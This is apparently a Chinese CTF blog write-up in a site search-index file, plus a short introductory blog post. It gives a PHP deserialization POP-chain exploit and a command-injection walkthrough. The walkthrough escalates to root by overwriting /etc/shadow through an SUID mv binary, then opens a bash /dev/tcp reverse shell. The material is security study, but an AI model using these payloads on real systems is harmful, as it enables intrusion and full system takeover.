        <content type="html"><![CDATA[<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>突然感觉这个比赛考的东西挺好的，但是在打的时候太心急了！</p><h2 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mason</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwe</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$bro</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$temp</span>=<span class="variable language_">$this</span>-&gt;bro;</span><br><span class="line">        <span class="variable">$temp</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;qwe = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;bro = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ethan</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$aer</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$asd</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">serialize</span>(<span class="variable">$this</span>-&gt;asd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;aer = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;asd = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Chloe</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$power</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dfg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hjk</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$say</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fn</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hjk = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;dfg = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;power = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;say = <span class="string">&quot;I want sleep&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="variable language_">$this</span>-&gt;say;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;power-&gt;hello;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fu =<span class="keyword">new</span> <span class="class"><span class="keyword">class</span>() </span>&#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="variable">$parent</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span> = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">backdoor</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;I want sleep&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Grace</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ou</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ou = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$good</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$temp</span> = <span class="variable language_">$this</span>-&gt;ou;</span><br><span class="line">        <span class="variable">$temp</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hjkl&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$hjkl</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;hjkl&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$hjkl</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前面的链子挺简单的就不分析了，关键是如何去触发backdoor这个方法？</p><p><strong>分链子打法加&amp;引用</strong></p><p>所谓分链子就是链子一分为二呗，引用就是共享同一内存，这意味着，只要内存发生变化，&amp;引用也会发生变化</p><p><strong>exp</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mason</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$bro</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ethan</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$asd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Chloe</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$power</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$say</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Grace</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ou</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Mason</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Ethan</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">Chloe</span>();</span><br><span class="line"><span class="variable">$c2</span> = <span class="keyword">new</span> <span class="title class_">Chloe</span>();</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="title class_">Grace</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;bro = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;asd = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;say = <span class="variable">$c2</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;power = <span class="variable">$d</span>;</span><br><span class="line"><span class="variable">$d</span>-&gt;ou = [&amp;<span class="variable">$c2</span>-&gt;fu,<span class="string">&#x27;backdoor&#x27;</span>];     <span class="comment">//callable的形式去调用对象的方法</span></span><br><span class="line"><span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$ser</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>));</span><br></pre></td></tr></table></figure><p>那么主要有两个疑问：</p><p>1.在触发<code>__toString</code>方法的时候为什么还要多创建一个<code>$c2 = new Chloe();</code>对象？</p><p>2.为什么在创建数组callable的时候第一个元素要加上&amp;？</p><p>对于第一个这就是我说的分链子，是为了让链子的结构更分明！那为什么要加&amp;呢？</p><p>这其实是一个<strong>先后顺序</strong>的问题！假设没有这个&amp;<code>$d-&gt;ou = [$c2-&gt;fu,&#39;backdoor&#39;];</code>你这个的第一个元素就是null，有&amp;这个那么就是第一个元素与<code>$c2-&gt;fu</code>共享同一内存地址，那么在序列化的时候就是&amp;null，但是在反序列化之后会触发<code>__toString</code>从而实现<code>$c2-&gt;fu</code>就是一个对象了！</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">考点：1，分链子 2，callable 3，引用内存共享</span><br></pre></td></tr></table></figure><h2 id="超级ping"><a href="#超级ping" class="headerlink" title="超级ping"></a>超级ping</h2><p><img src="/images/achieve/2025/10/1.png"></p><p>直接就有shell了！那会不会是没权限呢？</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -<span class="built_in">type</span> f -name <span class="string">&quot;fl*&quot;</span></span><br></pre></td></tr></table></figure><p>找了似乎没有，那只能考虑在当前用户没有权限的目录下了</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drwx------   1 root root 4096 Oct 21 06:33 root</span><br></pre></td></tr></table></figure><p>果然这个目录就只给了文件所有者权限</p><p>尝试suid提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/mv</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/sudo</span><br></pre></td></tr></table></figure><p>利用mv提权：构造恶意文件，然后mv移动污染&#x2F;etc&#x2F;shadow(这是存储用户密码的地方)</p><p>构造加盐加密的密码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 -salt flag root</span><br><span class="line">openssl passwd：openssl 工具中用于生成密码哈希的子命令</span><br><span class="line">-1：指定使用 MD5 算法来生成哈希，这是 Linux 系统中常见且兼容的格式（通常以 $1$ 开头）</span><br><span class="line"><span class="comment">#$1$flag$Qiv1fGuuojJhoMNhwWehP.</span></span><br><span class="line">最终要写的：root:$1$flag<span class="variable">$Qiv1fGuuojJhoMNhwWehP</span>.:18000:0:99999:7:::</span><br></pre></td></tr></table></figure><p>写入文件（寻找可写目录）：</p><p><img src="/images/achieve/2025/10/1.png"></p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?host=127.0.0.1;echo &#x27;root:<span class="built_in">$</span>1<span class="built_in">$</span>flag<span class="built_in">$</span>Qiv1fGuuojJhoMNhwWehP.:18000:0:99999:7:::&#x27; &gt; /home/ctfuser/txt</span><br><span class="line"></span><br><span class="line">?host=127.0.0.1;/usr/bin/mv /home/ctfuser/txt /etc/shadow</span><br><span class="line"></span><br><span class="line">?host=127.0.0.1;bash -c &quot;bash -i &gt;<span class="built_in">&amp;</span>/dev/tcp/ip/port 0&gt;<span class="built_in">&amp;</span>1&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/achieve/2025/10/3.png"></p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">考点：suid mv提权</span><br></pre></td></tr></table></figure><p>还有一题比赛时没看就懒得写了！</p>]]></content>
      
      
      <categories>
          
          <category> 赛题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php反序列化 </tag>
            
            <tag> suid提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>新的开始</title>
      <link href="/2025/10/23/hello-world/"/>
      <url>/2025/10/23/hello-world/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/achieve/2025/10/start.jpg"></p><p>早就想弄个blog记录学习了，但是之前一直觉得麻烦就一直在csdn发</p><p><a href="https://blog.csdn.net/2403_88003384?spm=1000.2115.3001.5343">rufeii_-CSDN博客</a></p><p>但是csdn这byd广告太多了，另外就是它的搜索检索有问题，于是就觉得不能再拖了！</p><p>自己还是太菜了，每天进步一点点吧，另外就是慢慢地学，不要急于求成！</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 记录 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
